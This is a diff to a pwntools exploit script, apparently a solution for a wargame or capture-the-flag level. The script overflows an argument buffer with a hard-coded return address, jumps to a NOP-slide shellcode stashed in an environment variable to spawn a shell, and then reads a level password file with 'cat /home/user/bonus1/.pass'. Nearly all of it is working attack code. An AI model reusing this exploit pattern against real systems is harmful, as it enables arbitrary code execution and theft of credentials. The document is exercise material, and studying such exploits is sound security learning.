@@ -51,13 +51,21 @@ def get_connection(custom_env=None, argv=None):
 def exploit():
 
  
-    conn = get_connection()
+
     
     shellcode = asm(shellcraft.i386.linux.sh())
     nop_slide = b"\x90" * 100
-    payload_arg1 = nop_slide + shellcode + b'\n'
+    paylod_env = nop_slide + shellcode 
 
-    payload_arg2 = b"A" * 9 + p32(0xbfffe6d0) + b"B" * 7 
+    
+    payload_arg1 = b"A" * 20
+    payload_arg2 = b"A" * 9 + p32(0xbfffff8f) + b"B" * 7 
+
+    conn = get_connection(
+        custom_env={
+            "SHELLCODE": paylod_env
+        }
+    )
 
     if LOCAL:
         gdb.attach(conn, '''
@@ -65,13 +73,13 @@ def exploit():
           continue
           ''')
 
-    # print(conn.recvuntil(b'\n'))
-    # conn.sendline(payload_arg1)
-    # print(payload_arg1)
+    print(conn.recvuntil(b'\n'))
+    conn.sendline(payload_arg1)
+    print(payload_arg1)
     
-    # print(conn.recvuntil(b'\n'))
-    # conn.sendline(payload_arg2)
-    # print(payload_arg2)
+    print(conn.recvuntil(b'\n'))
+    conn.sendline(payload_arg2)
+    print(payload_arg2)
 
 
     # Écrire les payloads dans /tmp/payload_a et /tmp/payload_b sur le serveur SSH si non LOCAL
@@ -82,7 +90,7 @@ def exploit():
     try:
         if not LOCAL:
             conn.recvuntil(b'$')
-            conn.sendline(b'cat /home/user/bonus0/.pass')
+            conn.sendline(b'cat /home/user/bonus1/.pass')
             flag = conn.recvline()
             print("\n=== Flag ===")
             print(flag.decode())
